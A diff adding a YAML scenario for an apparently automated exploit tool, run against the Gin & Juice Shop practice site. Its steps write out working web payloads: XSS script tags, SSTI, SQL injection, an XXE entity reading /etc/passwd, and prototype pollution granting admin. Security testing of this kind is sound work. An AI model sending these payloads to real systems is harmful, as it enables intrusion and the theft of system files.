@@ -1,0 +1,72 @@
+id: ginjuice-showcase
+name: Adversys Predator Exploit Showcase - Gin & Juice Shop
+mode: predator
+retry_on_failure: true
+steps:
+- id: probe-account
+  phase: reconnaissance
+  description: Check /my-account access status
+  action:
+    method: GET
+    path: /my-account
+  validate:
+    status_code: 200
+- id: reflected-xss-login
+  phase: exploitation
+  description: Trigger reflected XSS in login search param
+  action:
+    method: GET
+    path: /login?search=<script>alert(1)</script>
+  validate:
+    status_code: 200
+- id: template-injection
+  phase: exploitation
+  description: SSTI via category param (expect '49')
+  action:
+    method: GET
+    path: /catalog?category={{7*7}}
+  validate:
+    status_code: 200
+- id: sql-injection
+  phase: exploitation
+  description: SQLi in catalog category param
+  action:
+    method: GET
+    path: /catalog?category=' OR '1'='1
+  validate:
+    status_code: 200
+- id: reflected-xss-subscribe
+  phase: exploitation
+  description: XSS via email param on subscribe
+  action:
+    method: GET
+    path: /catalog/subscribe?email=<script>alert(1)</script>
+  validate:
+    status_code: 405
+- id: xxe-stock-endpoint
+  phase: exploitation
+  description: Test XXE injection in stock API
+  action:
+    method: POST
+    path: /catalog/product/stock
+    headers:
+      Content-Type: application/xml
+    payload: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><stock><id>&xxe;</id></stock>
+  validate:
+    status_code: 500
+- id: blog-proto-pollution
+  phase: exploitation
+  description: Exploit prototype pollution on /blog
+  action:
+    method: GET
+    path: /blog?__proto__[admin]=true
+  validate:
+    status_code: 200
+- id: vulnerable-angular
+  phase: reconnaissance
+  description: Fetch AngularJS file to flag CVEs
+  action:
+    method: GET
+    path: /resources/js/angular_1-7-7.js
+  validate:
+    status_code: 200
